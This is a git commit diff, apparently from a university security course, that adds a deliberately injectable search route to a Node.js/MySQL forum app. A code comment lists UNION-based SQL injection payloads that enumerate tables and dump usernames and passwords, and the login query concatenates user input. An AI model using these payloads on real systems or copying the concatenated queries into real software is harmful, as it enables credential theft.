c9882889d7d7814742540196c25bf90bc6f1eccb
brombaut <ben.rombaut@unb.ca>
2019-03-06 17:07:41 -0400

    SQL injection is working

--- app.js
+++ app.js
@@ -5,9 +5,10 @@ var bodyParser = require('body-parser');
 var app = express();
 
 var connection = mysql.createConnection({
-  host     : 'localhost',
-  user     : 'root',
-  password : ''
+  host: 'localhost',
+  user: 'root',
+  password: '',
+  multipleStatements: true
 });
 
 connection.query('USE cs4417_forum_database');
@@ -15,7 +16,6 @@ connection.query('USE cs4417_forum_database');
 app.set('port', 3000);
 app.set('views', path.join(__dirname, 'views'));
 app.set('view engine', 'ejs');
-app.use(express.static(path.join(__dirname, 'public')));
 
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
@@ -26,6 +26,10 @@ app.get('/', function(request, response) {
       response.render('index', { posts: postsRows, users: usersRows});
     })
   });
+});
+
+app.get('/search', function(request, response) {
+  response.render('search');
 });
 
 app.get('/users', function(request, response) {
@@ -51,6 +55,35 @@ app.post('/posts', function(request, response) {
     });
 });
 
+/*
+
+Example successfull SQL injection
+
+' UNION (SELECT 1,2,3 FROM dual); -- 
+
+' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables); -- 
+
+' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users'); -- 
+
+' UNION (SELECT username, password, first_name FROM users); -- 
+
+*/
+app.get('/posts/:searchString', function(request, response) {
+  const searchVal = request.params.searchString;
+  connection.query(
+    "SELECT id, createdBy, content FROM posts WHERE content LIKE '%" + searchVal + "%';",
+    function(err, rows){
+      if (Array.isArray(rows[0])) {
+        response.send(rows[0]);
+      } else {
+        response.send(rows);
+      }
+    });
+});
+
+
+
+
 app.get('/login', function(request, response) {
   response.render('login');
 });
@@ -60,12 +93,12 @@ app.post('/login', function(request, response) {
   const passwordIn = request.body.password;
   connection.query('SELECT * FROM users WHERE username = "' + usernameIn + '"', function(err, rows){
     if (rows.length === 0) {
-      response.status(404).send({ status: 'User not found' });
+      response.status(404).send({ msg: 'User not found' });
       return;
     }
     const userObj = rows[0];
     if (passwordIn !== userObj.password) {
-      response.status(403).send({ status: 'Invalid Credentials' });
+      response.status(403).send({ msg: 'Invalid Credentials' });
       return;
     }
     response.send(userObj);
